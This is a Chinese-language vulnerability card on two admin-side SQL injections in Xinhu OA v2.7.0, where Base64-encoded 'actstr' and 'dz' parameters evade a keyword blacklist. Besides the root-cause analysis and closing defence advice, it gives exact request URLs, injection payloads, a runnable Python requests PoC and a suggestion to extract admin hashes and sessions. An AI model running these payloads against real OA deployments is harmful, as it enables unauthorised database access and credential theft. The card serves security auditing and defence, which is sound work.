---
id: web-generic-sqli-xinhu-base64-filter-bypass-admin-actions
title: 信呼OA 后台 base64 参数绕过全局过滤：inputAction actstr 与 tableAction dz 两处 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: xinhu-base64-filter-bypass-admin-sqli
aliases:
- 信呼OA 0day
- getselectdataAjax SQL 注入
- savedbupurlAjax SQL 注入
- actstr base64 注入
- dz base64 注入
- sqlstore 注入
- setval 注入
tags:
- sqli
- php
- xinhu
- oa
- base64
- filter-bypass
- post-auth
- code-audit
- mysql
cve: []
severity: high
confidence: high
status: verified
affected_versions: 信呼OA v2.7.0（原文测试版本；未给修复版本）
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V248
  verified_at: '2026-11-07T13:17:41+08:00'
  notes: 已对照原文与 39 张图核对：v2.7.0（官网下载页/本地 xinhu_utf8_v2.7.0）、inputAction::getselectdataAjax 的 actstr→sqlstore、tableAction::savedbupurlAjax 的 dz→setval、jmuncode 过滤/解码顺序均与图 18/34/37/38 一致；图 36 返回 database()=rockxinhu27、图 39 返回 123ok 与卡内 PoC 一致。未验证点：两处均带管理员 Cookie（后台），未验证低权限/未授权可达性；未在本机执行。
---

## 一句话结论

信呼OA 的全局 `$rock->get()` 封装只对“收到的字符串”做关键字黑名单与 XSS 过滤，但 `webmain/flow/input/inputAction.php::getselectdataAjax()` 与 `webmain/system/table/tableAction.php::savedbupurlAjax()` 会先对参数 `actstr`/`dz` 做 `base64decode` 再拼进 SQL；攻击者把 SQL 载荷 Base64 编码后传入，黑名单看到的是纯 Base64 文本（不含 `select`、`union`、`sleep`、引号等），解码后的语句却进入 `sqlstore`/`setval` 的字符串拼接，形成后台 SQL 注入。文章 PoC 携带管理员 Cookie，按后台接口处理。

## 原理

- **过滤与解码的顺序错位**：`$rock->get($name)` → `jmuncode($val,$lx,$name)`。`jmuncode` 先判断是否以 `rockjm_` 开头、`$lx==1` 或 `isjm()` 为真并做相应解密，再判断是否以 `basejm_` 开头或 `$lx==5` 做 Base64 解码；之后才把结果转小写、遍历 `$lvlaras` 黑名单（`select`、`alter table`、`delete `、`drop `、`update `、`insert into`、`load_file`、`/*`、`*/`、`union`、`<script`、`sleep(`、`outfile`、`eval(`、`user(`、`phpinfo()` 等）并递归替换为空。
- 注意：`$rock->get()` 自身并不自动 Base64 解码 `actstr`/`dz`，而是业务方法在拿到参数后又调用 `$this->jm->base64decode(...)`。因此黑名单过滤发生在 Base64 文本上，解码发生在过滤之后，两个阶段的输入形态不同。
- **Sink 1：inputAction::getselectdataAjax()**：
  ```php
  $actstr = $this->jm->base64decode($this->get('actstr'));
  $acta   = explode(',', $actstr);
  $where  = arrvalue($acta, 2);
  if(isempt($act)) {
      if($actstr) $rows = c('input')->sqlstore($actstr);
      return $rows;
  }
  ```
  `sqlstore` 把 `$actstr1` 按逗号/竖线拆成表名、字段、条件，最终 `m($sqla[0])->getall($where,$sqla[1])`；条件部分 `$where` 被 `str_replace('$','')` 后直接拼进 SQL，没有参数化。文章 payload：`xinhu_city,id,admin|database() -- `，Base64 后作为 `actstr` 传入，响应返回 `database()` 的结果。
- **Sink 2：tableAction::savedbupurlAjax()**：
  ```php
  $dz = $this->get('dz');
  $dz = $this->jm->base64decode($dz);
  m('option')->setval('dbupurl', $dz);
  ```
  `setval($num,$val,...)` 用 `$num = explode('@',$num)[0]` 后构造 `$where = "`num`='$num'"`，查询/更新 `option` 表；`$num` 来自 Base64 解码后的 `$dz`，可闭合引号注入。文章 payload：`123' where `num`='dbupurl' or if(1=1,sleep(0.01),0) -- 123`，Base64 后作为 `dz` 传入。
- **鉴权位置**：`mainAction::__construct()` 依次调用 `initMysql/initConstruct/getTheme/initProject/initAction`；`Action::initProject()` → `getlogin()` → `logincheck()` → `loginnot()`。只有 `login`/`api` 等白名单模块（`$boss`）会跳过校验，且 `ActionNot` 用空 `logincheck()` 覆写了鉴权；`input`（flow）与 `table`（system）不在白名单，文章 PoC 带 `xinhu_ca_adminuser=admin` 等管理员 Cookie，因此这两处是后台注入。
- **为什么是 0day 挖掘点**：从底层 `mysql.php` 往上跟会撞到“所有参数都经过 `$rock->get()` 过滤”的假象；换到输入侧，全局搜索 `base64decode(` 找“先解码、后拼接”的 Action，就能绕过黑名单。文章的第三条思路（加密字符串绕过字符检测）正是这两处的成因。

## 触发条件

- 目标为信呼OA v2.7.0（或存在相同 `getselectdataAjax`/`savedbupurlAjax` 代码与 `jmuncode` 过滤逻辑的版本）。
- 攻击者拥有管理员/后台会话（文章 PoC 带管理员 Cookie）；`input`（flow）与 `table`（system）模块未命中 `login|api` 白名单，需正常登录鉴权。
- 数据库为 MySQL，`sqlstore` 目标表（如 `xinhu_city`）与 `option` 表存在，当前账号有查询/更新权限。
- 参数值可 Base64 编码后传入，且未被 WAF 对 Base64 长度/内容额外拦截。

## 利用步骤

1. 登录信呼OA后台，获取管理员 Cookie（`xinhu_ca_adminuser`、`xinhu_mo_adminid`、`PHPSESSID` 等）。
2. **第一处**：构造 `actstr` 明文 `xinhu_city,id,admin|database() -- `，Base64 编码后请求：
   `GET /index.php?m=input&a=getselectdata&d=flow&ajaxbool=true&act=&actstr=<base64>`
   响应出现数据库名（如 `rockxinhu27`）即注入成功；可把 `database()` 换成 `user()`、`@@version`、子查询等。
3. **第二处**：构造 `dz` 明文 `123' where `num`='dbupurl' or if(1=1,sleep(0.01),0) -- 123`，Base64 编码后请求：
   `GET /index.php?m=table&a=savedbupurl&d=system&ajaxbool=true&dz=<base64>`
   对比 `if(1=1,...)` 与 `if(1=2,...)` 的响应时间；返回 `123ok` 说明进入 `setval`。
4. 用时间/布尔盲注或 UNION 提取管理员哈希、会话、配置等数据；注意 Base64 编码会改变关键字形态，WAF 规则需相应调整。

## PoC

```python
import base64
import requests

base = "http://target/index.php"
cookies = {"PHPSESSID": "<admin session>", "xinhu_ca_adminuser": "admin"}

# 1) inputAction getselectdataAjax
payload1 = "xinhu_city,id,admin|database() -- "
actstr = base64.b64encode(payload1.encode()).decode()
r1 = requests.get(base, params={
    "m": "input", "a": "getselectdata", "d": "flow",
    "ajaxbool": "true", "act": "", "actstr": actstr,
}, cookies=cookies)
print(r1.text)

# 2) tableAction savedbupurlAjax
payload2 = "123' where `num`='dbupurl' or if(1=1,sleep(0.01),0) -- 123"
dz = base64.b64encode(payload2.encode()).decode()
r2 = requests.get(base, params={
    "m": "table", "a": "savedbupurl", "d": "system",
    "ajaxbool": "true", "dz": dz,
}, cookies=cookies)
print(r2.text)
```

文章实测：第一处响应返回 `123[{"database()":"rockxinhu27",...}]`；第二处返回 `123ok`（`sleep(0.01)` 用于验证时间盲注）。

## 变体与关联

- **同产品前台变体**：[[web-generic-sqli-xinhu-setwxqy-base64-mobile-getone]] 是同一根因（`base64decode` 绕过全局过滤）在 `loginAction::setwxqyAction` 的前台实例，参数为 `shouji`/`userid`，无需登录；本卡是 `input`/`table` 后台实例，参数与 sink 不同。
- **鉴权链**：[[web-generic-auth-xinhu-logincheck-empty-inheritance-bypass]] 解释 `ActionNot::logincheck()` 空实现与 `login|api` 白名单如何让前台接口免登录；本卡的两处不在白名单，需后台会话。
- **审计思路**：全局搜索 `base64decode(`、`rock->jm->`、`jmuncode(`，关注“解码后进入 SQL/命令/文件”的位置；同时检查 `$rock->get()` 的 `$lx` 参数是否被业务传入（`lx=5` 会直接 Base64 解码）。
- **其他 sink**：文章截图中的 `xinhuChajian.php`、`JpushChajian.php`、`mapqqChajian.php`、`rockeditChajian.php` 等也有 `base64decode` 调用，可继续按同样思路排查。

## 检测与防御

- 所有 SQL 使用 `PreparedStatement`/PDO 参数绑定；`sqlstore`/`setval` 等底层封装改为参数化，禁止把表名、字段名之外的用户输入拼进 `where`。
- 不要依赖“黑名单 + 后置解码”的顺序；对 Base64 参数先解码再校验，或直接拒绝业务不需要的编码参数。
- 修复 `setval`/`sqlstore` 的字符串拼接，限制 `m($table)` 的可选表/字段白名单；对 `option` 等配置表操作加权限校验。
- 监控后台请求中 `actstr`/`dz` 等参数出现长 Base64、解码后含 SQL 关键字的行为；WAF 对 Base64 解码后的内容做二次检测。
- 升级到修复版本，或在 `jmuncode` 中对 `$lx`/`basejm_` 解码路径增加 SQL 关键字检测（注意不要只做一次替换）。
